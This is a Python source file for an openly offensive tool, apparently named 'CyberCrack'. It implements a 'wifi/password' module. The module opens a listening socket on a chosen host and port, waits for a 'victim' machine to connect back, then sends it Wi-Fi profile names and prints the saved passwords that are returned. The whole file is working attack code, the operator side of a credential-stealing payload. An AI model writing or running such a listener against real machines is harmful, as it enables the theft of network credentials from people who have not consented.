from colorama import *
init()
import socket
red = Fore.RED
reset = Fore.RESET
def wifipass():
    while True:
        user_in = input("CyberCrack: CyberCrack/wifi/password > ")
        if user_in == "show options":
            def options():
                print(r"""
    : LHOST                  your ip address
    : LPORT                  any port you set up in the payload
    : run or exploit         run the script
                        """)
                return ""
        elif "LHOST " in user_in:
            ip = user_in.replace("LHOST ", "")
            print("LHOST = " + str(ip))
        elif "LPORT " in user_in:
            port = user_in.replace("LPORT ", "")
            print("LPORT = " + str(port))
        elif user_in == "run" or user_in == "exploit":
            try:
                import socket
                import time
                green = Fore.LIGHTGREEN_EX
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((str(ip), int(port)))
                server.listen(0)
                print("[+] Listening for encoming connections ")
                client, addr = server.accept()
                print("[+] One CyberSession opened.")
                print("[+] Victim connected. Please wait three seconds")
                time.sleep(3)
                data = client.recv(1048576)
                data = data.decode()
                print(green + data)
                try:
                    while True:
                        command = input("The profile you want the password > ")
                        client.send(command.encode())
                        password = client.recv(1048576)
                        print(green + password.decode())
                except KeyboardInterrupt:
                    quit()
                except ConnectionResetError:
                    print("[+] The connection was closed by the target host")
                    quit()
            except NameError:
                print("[+] Assign all parameters related to this payload")
        elif user_in == "help" or user_in == "show options":
            print(r"""
    : LHOST                             your ip address
    : LPORT                             the port to listen on
    : run or exploit                    run the script         
                    """)
        else:
            print(red + "Invalid Syntax" + reset)